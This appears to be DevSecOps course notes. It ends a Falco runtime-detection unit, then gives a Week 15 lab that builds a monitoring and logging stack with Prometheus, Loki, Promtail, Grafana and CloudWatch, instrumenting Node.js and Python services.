
### 🎯 Runtime detection fills the visibility gap

- Tools like Trivy and tfsec catch issues *before* deploy  
- Falco catches what happens *after deploy* — inside a live container

### 🔥 Attacks don’t always use known exploits

- A container with `bash`, `curl`, or `netcat` is enough for lateral movement
- Runtime behavior must match the workload’s *intended purpose*

### 🧠 eBPF is a DevSecOps superpower

- It enables **lightweight, kernel-level visibility**
- Falco, Cilium, Pixie, and modern security stacks are powered by eBPF

### 🧩 Detection must evolve with the app

- As your app changes (e.g., notes-service adding export features),
  your Falco rules and baselines should also evolve

---

## 🧰 How You’d Use This at Work

| Scenario | Action |
|----------|--------|
| Suspicious exec in container | Falco alert → SIEM → SecOps triage |
| PCI-DSS audit | Provide `auditd` logs + Falco policy pack |
| Incident response | Query alert context from Falco → identify image + command |
| Red team simulation | Use Falco + Sidekick to monitor exploitation path |

  - **Custom detection rules**
  - **Alerts routed to a central handler**

- Bonus: Image has been hardened (e.g., dropped root, dropped tools)

# 📡 Week 15 – Monitoring, Logging & Alerting

---

## 🎯 Core Learning Objectives

- Understand the pillars of observability: **Metrics, Logs, Traces**
- Deploy Prometheus, Loki, and Grafana for full-stack visibility
- Explore **AWS-native observability** with CloudWatch, CloudTrail, and GuardDuty
- Connect security events (e.g. Falco, IAM abuse, failed logins) to actionable alerts
- Build dashboards that help **DevSecOps triage threats faster**

---

## 🧠 Theory: Why Observability is Critical to DevSecOps

Security ≠ just prevention. In modern systems, **detection and response** matter just as much.

That means:

| Observability | Security Role |
|---------------|---------------|
| 📊 Metrics     | Detect anomalies (spikes, restarts, memory leaks) |
| 📜 Logs        | Detect misuse (API abuse, shell access) |
| 🔍 Traces      | Detect flow deviation or long tail latency |
| 🛑 Alerts      | Notify the right team — with enough context |

By instrumenting your apps and infrastructure with the right signals, you move from **reactive debugging** to **proactive threat detection**.

---

## 🔧 Tools Covered This Week

| Tool           | Purpose |
|----------------|---------|
| **Prometheus** | Metrics collection and alerting |
| **Loki**       | Log aggregation (like ELK but lightweight) |
| **Grafana**    | Visualization and dashboards |
| **Falco**      | Runtime security alerts (already deployed) |
| **CloudWatch** | AWS-native metrics, logs, and events |
| **GuardDuty**  | AWS threat detection (IAM misuse, DNS anomalies) |
| **SNS / EventBridge** | Alerting and automated response |

---

## 🧱 DevSecOps Tie-In

| Practice | This Week’s Coverage |
|----------|----------------------|
| **Shift Right Security** | Triage runtime events from Falco, App Logs, CloudTrail |
| **Continuous Monitoring** | Monitor CPU spikes, login failures, malicious requests |
| **Zero Trust Runtime** | Detect lateral movement and access violations |
| **Security Feedback Loop** | Use dashboards to inform hardening in CI/CD & IaC |
| **Compliance Evidence** | Show traceable, auditable evidence of alerting & logging (e.g. PCI, HIPAA)

# 🧪 Week 15 Guided Lab – Full Observability Stack for DevSecOps

## 1️⃣ System Metrics – Prometheus + Node Exporter

### 📦 A. Deploy Node Exporter

On EC2-based systems or ECS with EC2 capacity:

```bash
docker run -d \
  --name=node_exporter \
  -p 9100:9100 \
  --restart=unless-stopped \
  prom/node-exporter
📍 Why: Node Exporter collects system-level metrics: CPU, memory, disk I/O, etc.

If using Kubernetes:

# node-exporter-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter
spec:
  selector:
    matchLabels:
      app: node-exporter
  template:
    metadata:
      labels:
        app: node-exporter
    spec:
      containers:
      - name: node-exporter
        image: prom/node-exporter
        ports:
        - containerPort: 9100
📊 B. Configure Prometheus to scrape Node Exporter
Edit prometheus.yml:

scrape_configs:
  - job_name: 'node'
    static_configs:
      - targets: ['localhost:9100']  # or use Kubernetes service discovery
Restart Prometheus:

docker restart prometheus
🎯 Now Prometheus scrapes system metrics every 15s.

2️⃣ Application Metrics – Prometheus Client Libraries
🔧 A. Instrument the Node.js Auth Service
Install the client library:

npm install prom-client
In auth-service/index.js:

const promClient = require('prom-client');
const register = promClient.register;

// Create custom metrics
const loginAttempts = new promClient.Counter({
  name: 'auth_login_attempts_total',
  help: 'Total number of login attempts',
});

// Expose metrics endpoint
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});

// Instrument your login route
app.post('/login', async (req, res) => {
  loginAttempts.inc();
  // ...
});
🐍 B. Instrument the Python Notes Service
Install the Python client:

pip install prometheus-client
In notes_service/app.py:

from prometheus_client import Counter, generate_latest, CONTENT_TYPE_LATEST

login_counter = Counter('notes_create_requests_total', 'Total note creations')

@app.route('/create_note', methods=['POST'])
def create_note():
    login_counter.inc()
    return jsonify({"message": "Note created"})

@app.route('/metrics')
def metrics():
    return Response(generate_latest(), mimetype=CONTENT_TYPE_LATEST)
🔄 C. Scrape App Metrics in Prometheus
Update prometheus.yml:

scrape_configs:
  - job_name: 'auth-service'
    static_configs:
      - targets: ['auth-service:3000']

  - job_name: 'notes-service'
    static_configs:
      - targets: ['notes-service:5000']
✅ Completion So Far
✅	Task
🟢 Node Exporter running	
🟢 App metrics exposed on /metrics	
🟢 Prometheus scraping all targets	
🟢 Metrics accessible in Prometheus UI (http://localhost:9090)

## 3️⃣ Centralized Logging – Loki + Promtail

---

## 🧠 What We’re Doing

Logs are essential for:
- Investigating errors and suspicious behavior
- Performing forensic analysis
- Correlating events with metrics and traces

We’ll use:
- **Loki**: a log aggregator designed by Grafana Labs
- **Promtail**: an agent that tails logs and ships them to Loki
- **Grafana**: to search and visualize logs side-by-side with metrics

---

## 📦 A. Deploy Loki with Helm

> 🎯 This sets up the **Loki backend**, which stores and indexes logs for querying.

```bash
helm repo add grafana https://grafana.github.io/helm-charts
helm repo update

helm install loki grafana/loki-stack --set grafana.enabled=false
✅ What this does:

Adds Grafana Helm charts

Installs Loki and Promtail as Kubernetes components

Disables Grafana (we’ll use our own instance later)

🧠 Why: Loki is a lightweight alternative to ELK — perfect for containerized environments and works natively with Prometheus and Grafana.

🧭 B. Deploy Promtail to Collect Logs
Promtail reads container logs and adds labels (like job, pod, container), then sends to Loki.

helm upgrade --install promtail grafana/promtail \
  --set "loki.serviceName=loki"
✅ What this does:

Deploys Promtail DaemonSet

Configures it to forward logs to the Loki service

🔐 Security Tip: Label-based log routing enables filtering by namespace, pod, or service. This allows per-tenant observability in multi-team or multi-tenant systems.

🧩 C. Instrument Your App Logs
Node.js (auth-service)

app.post('/login', (req, res) => {
  console.log(`[LOGIN] User: ${req.body.username}`);
  loginAttempts.inc();
  res.status(200).json({ message: 'Login successful' });
});
Python (notes-service)

@app.route('/create_note', methods=['POST'])
def create_note():
    logger.info(f"[NOTE] Created by {request.json.get('user')}")
    login_counter.inc()
    return jsonify({"message": "Note created"})
✅ Why console.log/info?

In Kubernetes and Docker, stdout/stderr are captured by the container runtime

Promtail picks up these logs via container runtime paths (e.g. /var/log/pods/...)

🔎 D. Explore Logs in Grafana
Once Promtail and Loki are running:

Open Grafana UI (http://localhost:3000)

Add Loki as a data source

Go to Explore → Loki

Use this query to view logs:

{app="auth-service"} |= "LOGIN"
✅ LogQL Explanation:

{app="auth-service"}: label selector

|= "LOGIN": contains the string LOGIN

🧠 Why Logs Matter in DevSecOps
Value	Example
🛡️ Forensics	Who did what, when, and where?
🧭 Threat Hunting	Unexpected processes or users in logs
📊 Alert Triggers	Error rates, suspicious access logs
🧩 Correlation	Match metrics spikes to specific log lines
🧑‍💻 Audit Trail	Required for HIPAA, PCI, SOC2
🛠️ Optional: Use CloudWatch Instead
For ECS/Fargate or full AWS-native stacks, replace Promtail with CloudWatch log groups:

logConfiguration:
  logDriver: awslogs
  options:
    awslogs-group: /ecs/auth-service
    awslogs-region: us-east-1
    awslogs-stream-prefix: ecs
✅ What this does:

Sends container logs to CloudWatch

Compatible with EventBridge → alerting pipelines

✅	Task
🟢 Loki and Promtail deployed	
🟢 Logs ingested from Node.js and Python	
🟢 Queried logs using LogQL
